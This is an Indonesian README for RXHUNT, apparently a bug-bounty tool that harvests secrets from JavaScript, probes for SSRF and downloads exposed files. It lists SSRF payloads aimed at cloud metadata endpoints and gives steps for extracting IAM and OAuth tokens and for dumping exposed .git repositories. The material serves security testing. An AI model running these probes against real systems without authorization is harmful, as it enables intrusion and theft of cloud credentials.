# RXHUNT

```
 ██████╗ ██╗  ██╗██╗  ██╗██╗   ██╗███╗   ██╗████████╗
 ██╔══██╗╚██╗██╔╝██║  ██║██║   ██║████╗  ██║╚══██╔══╝
 ██████╔╝ ╚███╔╝ ███████║██║   ██║██╔██╗ ██║   ██║
 ██╔══██╗ ██╔██╗ ██╔══██║██║   ██║██║╚██╗██║   ██║
 ██║  ██║██╔╝ ██╗██║  ██║╚██████╔╝██║ ╚████║   ██║
 ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝
```

**Unified Bug Bounty CLI — JS Secret Harvester + SSRF Probe Chain + Referenced File Downloader**

> **PERINGATAN HUKUM:** Tool ini dibuat **hanya** untuk security research pada aset yang telah mendapat izin eksplisit. Penggunaan pada sistem tanpa otorisasi adalah tindakan ilegal. Pengguna bertanggung jawab penuh atas seluruh aktivitas yang dilakukan menggunakan tool ini.

---

## Daftar Isi

- [Tentang RXHUNT](#tentang-rxhunt)
- [Arsitektur & Cara Kerja](#arsitektur--cara-kerja)
- [Persyaratan Sistem](#persyaratan-sistem)
- [Instalasi](#instalasi)
- [Struktur Direktori](#struktur-direktori)
- [Panduan Penggunaan](#panduan-penggunaan)
  - [harvest — JS Secret Scan](#harvest--js-secret-scan)
  - [probe — SSRF Probe Chain](#probe--ssrf-probe-chain)
  - [download — Referenced File Downloader](#download--referenced-file-downloader)
  - [scan — Full Scan](#scan--full-scan)
- [Flag Global](#flag-global)
- [Mode Multi-Target](#mode-multi-target)
- [Output & Laporan](#output--laporan)
- [Integrasi Burp Suite / ZAP](#integrasi-burp-suite--zap)
- [Troubleshooting](#troubleshooting)
- [Referensi Secret Patterns](#referensi-secret-patterns)
- [Referensi Cloud Metadata Endpoints](#referensi-cloud-metadata-endpoints)

---

## Tentang RXHUNT

RXHUNT adalah command-line tool untuk security research yang menggabungkan tiga kapabilitas utama dalam satu pipeline:

**JS Secret Harvester** — Mengunduh dan menganalisis seluruh file JavaScript yang ditemukan di halaman target. Setiap file dipindai menggunakan dua metode secara bersamaan: pattern matching berbasis regex untuk lebih dari 40 jenis secret credential (AWS keys, GitHub tokens, database connection strings, private keys, dll.), serta analisis Shannon entropy untuk mendeteksi token/key yang tidak tercakup oleh pattern yang ada.

**SSRF Probe Chain** — Menginjeksikan payload SSRF ke URL parameter yang ditentukan, menggunakan database endpoint cloud metadata (AWS, GCP, Azure, Alibaba, Docker, Kubernetes) berikut puluhan varian bypass encoding (decimal IP, hex IP, octal IP, nip.io wildcard, credential prefix, path encoding, dan lainnya). Dilengkapi OOB listener bawaan sebagai alternatif Burp Collaborator.

**Referenced File Downloader** — Mem-parsing seluruh file JavaScript yang ditemukan untuk mengekstrak referensi ke file sensitif: source maps (`.js.map` yang mengandung source code asli), config endpoints (`/api/config`, `/api/settings`), serta path berbahaya yang umum (`.env`, `.git/config`, `swagger.json`, `wp-config.php`, dll.). File yang berhasil diakses diunduh lokal dan langsung dipindai untuk secret.

---

## Arsitektur & Cara Kerja

```
rxhunt.py (CLI entry point — Click)
│
├── modules/js_harvester.py
│   ├── discover_js_files()    — Crawl halaman, ekstrak semua <script src>
│   │                            + common paths + inline webpack chunks
│   ├── fetch_js()             — Async fetch dengan shared AsyncClient
│   └── extract_secrets()      — Pattern regex + Shannon entropy analysis
│
├── modules/ssrf_probe.py
│   ├── build_all_payloads()   — Generate payload × bypass variants per cloud
│   ├── _inject_get/post()     — Injeksi ke GET param atau POST form/JSON
│   └── _detect_ssrf()         — Heuristic: response body, status, elapsed time
│
├── modules/js_file_downloader.py
│   └── run()                  — Parse JS refs → attempt download → scan secrets
│
├── modules/oob_listener.py    — Asyncio TCP server untuk OOB callback detection
├── modules/reporter.py        — Rich terminal output + JSON report writer
└── config/patterns.py         — Regex patterns + cloud metadata endpoint DB
```

Seluruh operasi berjalan secara **asynchronous** menggunakan `asyncio` — JS files di-fetch secara concurrent (Semaphore 10), SSRF probes dijalankan concurrent (Semaphore 6), sehingga waktu eksekusi jauh lebih cepat dibanding sequential scan.

---

## Persyaratan Sistem

| Komponen | Minimum | Rekomendasi |
|---|---|---|
| Python | 3.9+ | 3.11+ |
| OS | Linux / Android (Termux) | Kali Linux / Ubuntu / Termux |
| Koneksi | Internet aktif | Stabil, low-latency |
| Port bebas | — | Port 8765 (OOB listener) |

---

## Instalasi

### Metode 1 — Script Otomatis (Termux & Linux)

```bash
# Clone atau ekstrak rxhunt ke direktori kerja
git clone https://github.com/rixz-dev/rxhunt.git
cd rxhunt/

# Jalankan install script
bash install.sh
```

Script `install.sh` akan otomatis:
- Mengecek ketersediaan Python 3
- Menginstal semua dependency via pip
- Memberikan izin eksekusi pada `rxhunt.py`

### Metode 2 — Manual

```bash
pip install httpx beautifulsoup4 click rich urllib3 --break-system-packages
chmod +x rxhunt.py
```

### Verifikasi Instalasi

```bash
python rxhunt.py --help
```

Output yang diharapkan:
```
 ██████╗ ██╗  ██╗ ...
 RXHUNT — JS Secret Harvester + SSRF Probe Chain + File Downloader
 
 Commands:
   download  Find and download files referenced in JS...
   harvest   Harvest secrets from JavaScript files...
   probe     Probe a URL parameter for SSRF...
   scan      Full scan: JS Secret Harvest AND SSRF Probe Chain.
```

Jika muncul error `Missing dependencies`, jalankan:
```bash
pip install httpx click rich beautifulsoup4 --break-system-packages
```

---

## Struktur Direktori

```
rxhunt/
├── rxhunt.py              Entry point utama
├── install.sh             Script instalasi Termux/Linux
├── requirements.txt       Dependency list
├── config/
│   ├── __init__.py
│   └── patterns.py        Regex patterns + cloud metadata DB
└── modules/
    ├── __init__.py
    ├── js_harvester.py    Core JS crawler & secret extractor
    ├── js_file_downloader.py  Referenced file downloader
    ├── ssrf_probe.py      SSRF payload generator & prober
    ├── oob_listener.py    Built-in OOB callback listener
    └── reporter.py        Terminal output & JSON report
```

---

## Panduan Penggunaan

### harvest — JS Secret Scan

Perintah `harvest` melakukan crawling JS files dari target URL, kemudian menganalisis isinya untuk menemukan credential, API key, token, private key, dan string high-entropy lainnya.

**Sintaks:**
```bash
python rxhunt.py harvest <URL> [OPTIONS]
```

**Contoh Penggunaan:**

Scan dasar:
```bash
python rxhunt.py harvest https://target.com
```

Scan dengan verbose output (menampilkan JS files yang gagal di-fetch, timeout, dll.):
```bash
python rxhunt.py harvest https://target.com --verbose
```

Scan dengan cookie sesi (untuk target yang membutuhkan autentikasi):
```bash
python rxhunt.py harvest https://target.com --cookie "session=abc123; csrf=xyz789"
```

Scan lebih dalam dengan batas JS file lebih besar:
```bash
python rxhunt.py harvest https://target.com --max-files 150
```

Nonaktifkan entropy detection (hanya gunakan pattern matching, lebih cepat, lebih sedikit false positive):
```bash
python rxhunt.py harvest https://target.com --no-entropy
```

Simpan hasil ke file JSON:
```bash
python rxhunt.py harvest https://target.com --output hasil_harvest.json
```

Scan lengkap dengan semua opsi:
```bash
python rxhunt.py harvest https://target.com \
  --max-files 100 \
  --timeout 15 \
  --cookie "session=TOKEN_SESI" \
  --header "Authorization: Bearer JWT_TOKEN" \
  --proxy http://127.0.0.1:8080 \
  --verbose \
  --output report.json
```

**Opsi Lengkap:**

| Flag | Default | Keterangan |
|---|---|---|
| `--max-files / -m` | 60 | Batas maksimum JS file yang dipindai per target |
| `--timeout / -t` | 12 | Timeout request dalam detik |
| `--no-entropy` | off | Matikan deteksi berbasis Shannon entropy |
| `--output / -o` | — | Simpan laporan ke file JSON |
| `--input / -i` | — | File berisi daftar URL (multi-target) |

**Memahami Output:**

Setelah scan selesai, tool menampilkan:

```
  JS Files Discovered: 23
  → https://target.com/static/js/main.abc123.js
  → https://target.com/static/js/vendor.def456.js
  ... dan 21 lainnya

──────────────── JS Secret Harvest ────────────────

  Findings: 5  3 CRITICAL  1 HIGH  1 MEDIUM  0 LOW

   CRITICAL  (3 findings)
  ┌──────────────────────┬──────────────┬──────────────────────┬───────────┐
  │ Type                 │ Description  │ Value                │ Source    │
  ├──────────────────────┼──────────────┼──────────────────────┼───────────┤
  │ aws_access_key_id    │ AWS Access.. │ AKIA4P2K...a7Bx      │ main.js   │
  │ database_url_mongodb │ MongoDB Conn │ mongodb://admin:...  │ vendor.js │
  │ openai_api_key       │ OpenAI API.. │ sk-proj-Ab...zQ      │ app.js    │
  └──────────────────────┴──────────────┴──────────────────────┴───────────┘
```

- **Value** ditampilkan dalam format redacted (8 karakter pertama + `...` + 4 karakter terakhir) untuk keamanan
- Severity: **CRITICAL** (merah tebal) → **HIGH** (merah) → **MEDIUM** (kuning) → **LOW** (cyan redup)

**Jika tidak ada JS file yang ditemukan:**

Tool menampilkan pesan `No JS files discovered`. Kemungkinan penyebab:
- Target menggunakan Single Page Application (SPA) dengan lazy loading — coba scan halaman spesifik, bukan hanya root URL
- Target membutuhkan autentikasi — tambahkan `--cookie`
- Target memblokir User-Agent default — tambahkan `--header "User-Agent: Mozilla/5.0 ..."`
- JS files di-load via webpack chunk dinamis — coba tambahkan `--max-files 200`

---

### probe — SSRF Probe Chain

Perintah `probe` menginjeksikan ratusan payload SSRF ke URL parameter yang ditentukan, mencakup seluruh cloud metadata endpoints dengan berbagai teknik bypass.

**Sintaks:**
```bash
python rxhunt.py probe <URL> --param <NAMA_PARAMETER> [OPTIONS]
```

**Contoh Penggunaan:**

Probe dasar pada GET parameter:
```bash
python rxhunt.py probe https://target.com/fetch --param url
```

Probe pada POST endpoint (form-encoded):
```bash
python rxhunt.py probe https://target.com/api/fetch --param target -m POST
```

Probe pada POST endpoint API modern (JSON body):
```bash
python rxhunt.py probe https://target.com/api/fetch --param target -m POST --json-post
```

Probe dengan OOB host eksternal (Burp Collaborator / interactsh):
```bash
python rxhunt.py probe https://target.com/fetch --param url --oob abc123.oast.fun
```

Probe dengan OOB listener lokal (tidak perlu tool eksternal):
```bash
python rxhunt.py probe https://target.com/fetch --param url --listen
```

> **Catatan OOB Listener Lokal:** Flag `--listen` akan menjalankan server TCP sederhana di port `8765` pada IP LAN lokal. Tool akan otomatis mendeteksi IP LAN dan menjadikannya sebagai OOB host. Gunakan ini ketika target berada dalam jaringan yang sama (lab environment, internal pentest). Untuk target di internet, gunakan `--oob` dengan layanan eksternal seperti Burp Collaborator atau interactsh.

Probe hanya untuk cloud tertentu (lebih cepat, lebih fokus):
```bash
python rxhunt.py probe https://target.com/fetch --param url --cloud aws --cloud gcp
```

Probe tanpa berhenti saat SSRF pertama ditemukan (lanjutkan semua payload):
```bash
python rxhunt.py probe https://target.com/fetch --param url --no-stop
```

Simpan hasil:
```bash
python rxhunt.py probe https://target.com/fetch --param url --output ssrf_report.json
```

**Opsi Lengkap:**

| Flag | Default | Keterangan |
|---|---|---|
| `--param / -p` | **WAJIB** | Nama parameter yang akan diinjeksi payload SSRF |
| `--method / -m` | GET | HTTP method: `GET` atau `POST` |
| `--json-post` | off | POST payload sebagai JSON body (bukan form-encoded) |
| `--cloud / -c` | semua | Filter cloud: `aws` `gcp` `azure` `alibaba` `docker` `kubernetes` `localhost` |
| `--oob` | — | External OOB hostname (Burp Collaborator, interactsh, dll.) |
| `--listen` | off | Jalankan OOB listener lokal di LAN IP |
| `--listen-port` | 8765 | Port untuk OOB listener lokal |
| `--no-stop` | off | Jangan berhenti setelah SSRF pertama dikonfirmasi |
| `--timeout / -t` | 10 | Timeout per probe dalam detik |
| `--output / -o` | — | Simpan hasil ke JSON |

**Memahami Indikasi SSRF:**

| Indikasi | Arti |
|---|---|
| `CONFIRMED_SSRF` | Response body mengandung string metadata cloud (contoh: `ami-id`, `instance-id`, `service-accounts`) — SSRF terbukti terjadi |
| `POTENTIAL_SSRF` | HTTP 200 dengan response body mengandung kata kunci generik (`meta`, `instance`, `credential`, `token`) |
| `TIMEOUT_BLIND_POSSIBLE` | Request timeout mendekati limit — kemungkinan blind SSRF (server mencoba fetch tapi tidak ada response balik) |
| `ERROR_BLIND_POSSIBLE` | HTTP 500/502/503 dengan body sangat pendek — server mengalami error saat mencoba fetch internal URL |

**Jika `CONFIRMED_SSRF` ditemukan:**

Tool akan menampilkan snippet response yang mengandung data metadata cloud. Langkah selanjutnya secara manual:

1. Catat payload spesifik yang berhasil (URL dan teknik bypass yang digunakan)
2. Gunakan Burp Suite untuk melakukan request manual ke payload tersebut
3. Eksplorasi endpoint metadata lebih dalam:
   - AWS: coba `/latest/meta-data/iam/security-credentials/` untuk mendapatkan temporary credentials
   - GCP: coba `/computeMetadata/v1/instance/service-accounts/default/token` untuk access token
   - Azure: coba `/metadata/identity/oauth2/token` untuk OAuth token
4. Dokumentasikan seluruh temuan untuk laporan bug bounty

**Jika ingin menggunakan interactsh sebagai OOB host:**

```bash
# Install interactsh-client dulu (jika belum ada)
# Download dari: https://github.com/projectdiscovery/interactsh

# Jalankan interactsh untuk mendapatkan OOB URL
./interactsh-client
# Output: https://abcd1234.oast.fun

# Gunakan di rxhunt
python rxhunt.py probe https://target.com/fetch --param url --oob abcd1234.oast.fun
```

Pantau callbacks di terminal interactsh secara terpisah.

---

### download — Referenced File Downloader

Perintah `download` mem-parsing semua JS file yang ditemukan di target untuk mengekstrak referensi ke file sensitif, kemudian mencoba mengakses dan mengunduh file-file tersebut.

**Sintaks:**
```bash
python rxhunt.py download <URL> [OPTIONS]
```

File yang dicari:
- **Source maps** — `*.js.map` mengandung source code JavaScript asli sebelum minifikasi/obfuskasi
- **Config endpoints** — `/api/config`, `/api/settings`, `/config.json`, dll.
- **Sensitive paths** — `.env`, `.git/config`, `swagger.json`, `openapi.json`, `wp-config.php`, `*.sql`, `*.bak`, dll.

**Contoh Penggunaan:**

Download dasar:
```bash
python rxhunt.py download https://target.com
```

Tentukan direktori output:
```bash
python rxhunt.py download https://target.com -d ./loot/target_files
```

Download saja tanpa scan secret pada file yang diunduh:
```bash
python rxhunt.py download https://target.com --no-scan
```

Download dengan autentikasi:
```bash
python rxhunt.py download https://target.com --cookie "session=TOKEN" -d ./authenticated_loot
```

Download verbose (tampilkan semua request dan referensi yang ditemukan):
```bash
python rxhunt.py download https://target.com --verbose
```

**Opsi Lengkap:**

| Flag | Default | Keterangan |
|---|---|---|
| `--max-files / -m` | 60 | Batas JS file yang di-crawl untuk mencari referensi |
| `--output-dir / -d` | `rxhunt_downloads` | Direktori untuk menyimpan file yang berhasil diunduh |
| `--no-scan` | off | Lewati secret scanning pada file yang diunduh |
| `--timeout / -t` | 12 | Timeout request dalam detik |
| `--output / -o` | — | Simpan laporan ke JSON |

**Memahami Output:**

```
──────────── Phase 2/2  Referenced File Download ────────────

  ┌──────────────────────┬────────────────────────────────────┬─────────┬─────────┐
  │ Type                 │ Path                               │ Size    │ Secrets │
  ├──────────────────────┼────────────────────────────────────┼─────────┼─────────┤
  │ source_map           │ /static/js/main.abc123.js.map      │ 245,891B│    0    │
  │ config_endpoint      │ /api/config                        │ 1,203B  │    3    │
  │ sensitive_file       │ /.git/config                       │ 312B    │    0    │
  └──────────────────────┴────────────────────────────────────┴─────────┴─────────┘

  3 files downloaded to /home/user/rxhunt_downloads
```

**Jika source map berhasil diunduh:**

Source map adalah goldmine. Berisi source code JavaScript sebelum build/minifikasi. Buka dengan:

```bash
# Lihat isi source map
cat rxhunt_downloads/main.abc123.js.map | python3 -m json.tool | less

# Extract semua source files yang terdaftar
cat rxhunt_downloads/main.abc123.js.map | python3 -c "
import json, sys
data = json.load(sys.stdin)
for src in data.get('sources', []):
    print(src)
"
```

Untuk me-reconstruct seluruh source tree dari source map, gunakan tool `sourcemapper`:
```bash
# Install sourcemapper
npm install -g sourcemapper

# Reconstruct source tree
sourcemapper -url https://target.com/static/js/main.abc123.js.map -output ./reconstructed_src
```

Setelah source tree di-reconstruct, cari secret di seluruh file:
```bash
grep -r "password\|secret\|api_key\|token\|private" ./reconstructed_src/
```

**Jika `.git/config` berhasil diakses:**

Ini mengindikasikan `.git` directory ter-expose. Gunakan tool `git-dumper` untuk mengunduh seluruh repository:
```bash
pip install git-dumper --break-system-packages
git-dumper https://target.com/.git ./git_dump
cd git_dump && git log --oneline
```

---

### scan — Full Scan

Perintah `scan` menggabungkan `harvest` dan `probe` dalam satu run. Cocok untuk initial assessment target baru.

**Sintaks:**
```bash
python rxhunt.py scan <URL> [OPTIONS]
```

**Contoh Penggunaan:**

Full scan tanpa SSRF (hanya JS harvest):
```bash
python rxhunt.py scan https://target.com
```

Full scan dengan SSRF probe:
```bash
python rxhunt.py scan https://target.com --param url
```

Full scan dengan OOB listener lokal:
```bash
python rxhunt.py scan https://target.com --param redirect --listen -o full_report.json
```

Full scan authenticated dengan proxy:
```bash
python rxhunt.py scan https://target.com \
  --param url \
  --cookie "session=TOKEN" \
  --proxy http://127.0.0.1:8080 \
  --verbose \
  --output full_report.json
```

Full scan pada target API modern (POST JSON):
```bash
python rxhunt.py scan https://target.com/api \
  --param fetchUrl \
  -m POST \
  --json-post \
  --cloud aws \
  --cloud gcp \
  --listen
```

**Opsi Lengkap:**

`scan` menerima semua opsi dari `harvest` dan `probe`, ditambah:

| Flag | Keterangan |
|---|---|
| `--param / -p` | Parameter SSRF (opsional — jika tidak diisi, fase SSRF dilewati) |
| `--method / -m` | HTTP method untuk SSRF probe |
| `--json-post` | POST sebagai JSON |
| `--max-files` | Batas JS file untuk fase harvest |
| `--cloud / -c` | Filter cloud target SSRF |
| `--listen` | Aktifkan OOB listener lokal |
| `--oob` | External OOB host |

---

## Flag Global

Flag berikut tersedia untuk **semua** perintah (harvest, probe, download, scan):

| Flag | Contoh | Keterangan |
|---|---|---|
| `--proxy` | `http://127.0.0.1:8080` | Route semua request melalui proxy (Burp Suite, ZAP, mitmproxy) |
| `--cookie` | `"session=abc; csrf=xyz"` | Cookie header untuk scan yang membutuhkan autentikasi |
| `--header / -H` | `"X-Auth: token"` | Tambah custom request header (bisa dipakai berulang) |
| `--verbose / -v` | *(flag)* | Tampilkan debug output: request yang gagal, timeout, error detail |

**Penggunaan Multiple Headers:**
```bash
python rxhunt.py harvest https://target.com \
  --header "Authorization: Bearer eyJhbGc..." \
  --header "X-API-Key: abc123" \
  --header "X-Custom-Header: value"
```

---

## Mode Multi-Target

Semua perintah mendukung pemrosesan beberapa target sekaligus melalui file input.

**Format file `urls.txt`:**
```
# Baris diawali # diabaikan
https://target1.com
https://target2.com/app
https://target3.com
```

**Penggunaan:**
```bash
# Harvest semua target
python rxhunt.py harvest --input urls.txt --output harvest_all.json

# SSRF probe semua target
python rxhunt.py probe --input urls.txt --param url --output ssrf_all.json

# Full scan semua target
python rxhunt.py scan --input urls.txt --param redirect -o full_all.json
```

Tool akan memproses setiap target secara berurutan dan menampilkan summary per target.

---

## Output & Laporan

### Format Laporan JSON

Gunakan flag `--output <nama_file.json>` pada perintah apapun untuk menyimpan laporan.

Contoh struktur laporan harvest:
```json
{
  "tool": "RXHUNT v2.0.0",
  "author": "rixz | ANERS",
  "generated_at": "2025-04-27T15:30:00",
  "type": "js_harvest",
  "target": "https://target.com",
  "js_files": ["https://target.com/static/js/main.js", "..."],
  "findings_count": 3,
  "findings": [
    {
      "type": "aws_access_key_id",
      "description": "AWS Access Key ID",
      "value": "AKIA4P2K...",
      "severity": "CRITICAL",
      "source": "https://target.com/static/js/main.js",
      "context": "...const AWS_KEY = \"AKIA4P2K...\"; const...",
      "detection": "pattern"
    }
  ]
}
```

### Mencegah Overwrite Report

Jika file output sudah ada, tool **tidak akan** menimpa file tersebut. Sebaliknya, laporan baru akan disimpan dengan timestamp appended:
```
report.json         ← sudah ada
report_20250427_153000.json  ← laporan baru diberi timestamp
```

### Membaca Laporan JSON

```bash
# Pretty print
cat report.json | python3 -m json.tool

# Filter hanya findings CRITICAL
cat report.json | python3 -c "
import json, sys
data = json.load(sys.stdin)
for f in data.get('findings', []):
    if f['severity'] == 'CRITICAL':
        print(f['type'], '|', f['value'][:30])
"

# Hitung jumlah findings per severity
cat report.json | python3 -c "
import json, sys
from collections import Counter
data = json.load(sys.stdin)
c = Counter(f['severity'] for f in data.get('findings', []))
print(dict(c))
"
```

---

## Integrasi Burp Suite / ZAP

Routing traffic melalui proxy memungkinkan inspeksi dan modifikasi request secara manual.

**Setup Burp Suite:**

1. Buka Burp Suite, pastikan proxy listener aktif di `127.0.0.1:8080`
2. Jalankan rxhunt dengan flag `--proxy`:

```bash
python rxhunt.py harvest https://target.com --proxy http://127.0.0.1:8080
python rxhunt.py probe https://target.com/api --param url --proxy http://127.0.0.1:8080
```

3. Seluruh request dari rxhunt akan muncul di tab **Proxy > HTTP History** Burp Suite
4. Request yang menarik bisa di-forward ke Repeater untuk eksplor manual

**Catatan untuk Burp Suite dengan HTTPS:**

Jika target menggunakan HTTPS dan muncul SSL error, rxhunt sudah menggunakan `verify=False` secara default, sehingga tidak perlu konfigurasi tambahan. Pastikan Burp CA certificate sudah ter-install jika perlu intercept traffic.

---

## Troubleshooting

### `ModuleNotFoundError: No module named 'httpx'`

Dependency belum terinstal. Jalankan:
```bash
pip install httpx beautifulsoup4 click rich --break-system-packages
```

Untuk Termux secara spesifik:
```bash
pkg install python -y
pip install httpx beautifulsoup4 click rich --break-system-packages
```

---

### `No JS files discovered`

Penyebab umum dan solusi:

**Target membutuhkan login:**
```bash
# Ambil cookie dari browser (DevTools > Application > Cookies)
python rxhunt.py harvest https://target.com --cookie "session=NILAI_SESSION_DARI_BROWSER"
```

**Target memblokir User-Agent default:**
```bash
python rxhunt.py harvest https://target.com \
  --header "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
```

**JS files di-load dinamis (lazy loading):**
- Buka target di browser, buka DevTools > Network, filter `.js`
- Salin URL beberapa JS file yang ter-load
- Buat file `js_urls.txt` dengan URL tersebut
- Gunakan `harvest` pada URL halaman yang ter-load setelah interaksi user

---

### `OOB listener failed to start: [Errno 98] Address already in use`

Port 8765 sedang digunakan proses lain. Solusi:

```bash
# Cek proses yang menggunakan port 8765
lsof -i :8765
# atau
ss -tlnp | grep 8765

# Kill prosesnya
kill -9 <PID>

# Atau gunakan port lain
python rxhunt.py probe https://target.com/fetch --param url --listen --listen-port 9876
```

---

### SSRF probe berjalan sangat lambat

Jika jumlah payload besar dan koneksi lambat, batasi scope cloud:
```bash
# Hanya test AWS dan GCP
python rxhunt.py probe https://target.com/fetch --param url --cloud aws --cloud gcp
```

Atau kurangi timeout:
```bash
python rxhunt.py probe https://target.com/fetch --param url --timeout 5
```

---

### Banyak false positive pada `harvest`

Matikan entropy detection dan hanya andalkan pattern matching:
```bash
python rxhunt.py harvest https://target.com --no-entropy
```

False positive dari pattern-based (misalnya `hardcoded_password` atau `staging_endpoint`) adalah hal wajar — verifikasi manual setiap temuan sebelum dilaporkan.

---

### Request gagal semua dengan error SSL

rxhunt sudah menonaktifkan SSL verification secara default. Jika masih muncul error:
```bash
# Tambahkan verbose untuk melihat error detail
python rxhunt.py harvest https://target.com --verbose

# Jika target membutuhkan SNI spesifik atau ada masalah certificate chain,
# gunakan proxy Burp untuk intercept dan forward
python rxhunt.py harvest https://target.com --proxy http://127.0.0.1:8080 --verbose
```

---

### Di Termux: `Permission denied` saat menjalankan rxhunt.py

```bash
chmod +x rxhunt.py
python rxhunt.py harvest https://target.com
```

Selalu panggil dengan `python rxhunt.py`, bukan `./rxhunt.py`, di Termux.

---

## Referensi Secret Patterns

Berikut seluruh jenis secret yang dideteksi oleh modul `harvest`:

| Pattern Name | Severity | Deskripsi |
|---|---|---|
| `aws_access_key_id` | CRITICAL | AWS Access Key ID (`AKIA...`) |
| `aws_secret_access_key` | CRITICAL | AWS Secret Access Key |
| `aws_mws_key` | HIGH | AWS Marketplace Web Service Key |
| `gcp_service_account_json` | CRITICAL | GCP Service Account JSON blob |
| `gcp_api_key` | HIGH | Google/GCP API Key (`AIza...`) |
| `google_oauth_client` | MEDIUM | Google OAuth Client ID |
| `google_oauth_secret` | HIGH | Google OAuth Client Secret |
| `stripe_secret_live` | CRITICAL | Stripe Live Secret Key (`sk_live_...`) |
| `stripe_secret_test` | MEDIUM | Stripe Test Secret Key (`sk_test_...`) |
| `stripe_publishable_live` | MEDIUM | Stripe Live Publishable Key |
| `stripe_restricted` | HIGH | Stripe Restricted Key |
| `github_pat_fine` | CRITICAL | GitHub Fine-Grained PAT (`github_pat_...`) |
| `github_pat_classic` | HIGH | GitHub Classic PAT (`ghp_...`) |
| `github_oauth_token` | HIGH | GitHub OAuth Token (`gho_...`) |
| `github_actions_token` | HIGH | GitHub Actions Token (`ghs_...`) |
| `github_refresh_token` | HIGH | GitHub Refresh Token (`ghr_...`) |
| `github_legacy_token` | HIGH | GitHub Legacy Token (hex 40 char) |
| `slack_bot_token` | HIGH | Slack Bot Token (`xoxb-...`) |
| `slack_user_token` | HIGH | Slack User Token (`xoxp-...`) |
| `slack_app_token` | HIGH | Slack App Token (`xapp-...`) |
| `slack_webhook` | HIGH | Slack Webhook URL |
| `twilio_account_sid` | HIGH | Twilio Account SID |
| `twilio_auth_token` | HIGH | Twilio Auth Token |
| `sendgrid_api_key` | HIGH | SendGrid API Key (`SG....`) |
| `mailchimp_api_key` | MEDIUM | Mailchimp API Key |
| `jwt_token` | HIGH | JSON Web Token (JWT) |
| `private_key_rsa` | CRITICAL | RSA Private Key |
| `private_key_ec` | CRITICAL | EC Private Key |
| `private_key_openssh` | CRITICAL | OpenSSH Private Key |
| `pgp_private_key` | CRITICAL | PGP Private Key Block |
| `firebase_url` | MEDIUM | Firebase Realtime DB URL |
| `firebase_api_key` | MEDIUM | Firebase API Key |
| `heroku_api_key` | HIGH | Heroku API Key |
| `database_url_postgres` | CRITICAL | PostgreSQL Connection String |
| `database_url_mysql` | CRITICAL | MySQL Connection String |
| `database_url_mongodb` | CRITICAL | MongoDB Connection String |
| `database_url_redis` | HIGH | Redis Connection String |
| `hardcoded_password` | HIGH | Hardcoded password dalam kode |
| `hardcoded_secret` | HIGH | Hardcoded secret/api_secret |
| `internal_ip_rfc1918` | MEDIUM | IP address internal (RFC 1918) |
| `staging_endpoint` | LOW | Endpoint staging/dev/internal |
| `localhost_url` | LOW | URL localhost yang ter-expose |
| `openai_api_key` | CRITICAL | OpenAI API Key (`sk-proj-...` atau `sk-` 48 char) |
| `anthropic_api_key` | CRITICAL | Anthropic API Key (`sk-ant-...`) |
| `telegram_bot_token` | HIGH | Telegram Bot Token |
| `cloudflare_api_key` | HIGH | Cloudflare API Key/Token |
| `supabase_service_key` | HIGH | Supabase Service/Anon Key (JWT) |
| `high_entropy_string` | LOW | String high-entropy yang tidak tercakup pattern (deteksi entropy) |

---

## Referensi Cloud Metadata Endpoints

Berikut endpoint yang digunakan oleh modul `probe`:

**AWS (Amazon Web Services)**
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/meta-data/hostname
```

**GCP (Google Cloud Platform)**
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://169.254.169.254/computeMetadata/v1/
```

**Azure**
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&...
```

**Alibaba Cloud**
```
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/
```

**Docker / Internal Network**
```
http://172.17.0.1/
http://172.18.0.1/
http://172.19.0.1/
```

**Kubernetes**
```
http://kubernetes.default.svc/api/v1/
https://kubernetes.default.svc/api/
http://10.96.0.1/api/v1/namespaces/
```

**Localhost Variants**
```
http://localhost/
http://127.0.0.1/
http://0.0.0.0/
http://[::1]/
http://localhost:8080/
http://localhost:8000/
http://localhost:3000/
http://localhost:5000/
```

Setiap endpoint di atas diperluas dengan bypass variants: decimal IP, hex IP, octal IP, `nip.io`, credential prefix, path encoding, triple slash, dan lainnya — menghasilkan puluhan hingga ratusan payload per run.

---

## Lisensi

Tool ini dikembangkan untuk keperluan **authorized security testing** semata.

**Dilarang keras:**
- Menggunakan tool ini pada sistem, jaringan, atau aplikasi tanpa izin tertulis dari pemilik
- Menggunakan hasil scan untuk tujuan kriminal, extortion, atau akses tidak sah
- Mendistribusikan ulang tanpa atribusi

Pengguna bertanggung jawab penuh atas kepatuhan terhadap hukum dan regulasi yang berlaku di jurisdiksi masing-masing.

---

*RXHUNT v1.0.0 — Developed by r¡xzXsploit | ANERS*
